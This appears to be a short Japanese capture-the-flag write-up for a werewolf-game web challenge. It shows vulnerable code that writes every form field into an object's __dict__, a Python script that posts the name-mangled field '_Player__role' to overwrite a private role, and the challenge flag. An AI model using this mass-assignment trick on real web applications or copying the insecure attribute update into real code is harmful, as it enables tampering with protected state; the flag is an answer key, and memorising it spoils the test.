# writeup

配布されたpythonのコードを読み込む

```
class Player:
    def __init__(self):
        self.name = None
        self.color = None
        self.__role = random.choice(['VILLAGER', 'FORTUNE_TELLER', 'PSYCHIC', 'KNIGHT', 'MADMAN', 'WEREWOLF'])
```
```
for k, v in request.form.items():
    player.__dict__[k] = v

```
上記のPlayerクラスのプライベート関数の__roleを手に入れたい  
[Pythonのプライベート変数の振る舞いについて](https://qiita.com/marmalade_boy/items/dd78c460ceb639c023ad)

こちらを読んで理解したので回答のコードを書く

<details><summary>コード</summary><div>
コード全文
```
import requests
def request():
    data = {
        'name': 'test',
        'color': 'YELLO',
        '_Player__role': 'WEREWOLF'
    }
    req = requests.post('{url}', data=data)
    body = req.content.decode()
    print(body)
if __name__ == '__main__':
    request()
```
</div></details>

<details><summary>flag</summary><div>
ctf4b{there_are_so_many_hackers_among_us}
</div></details>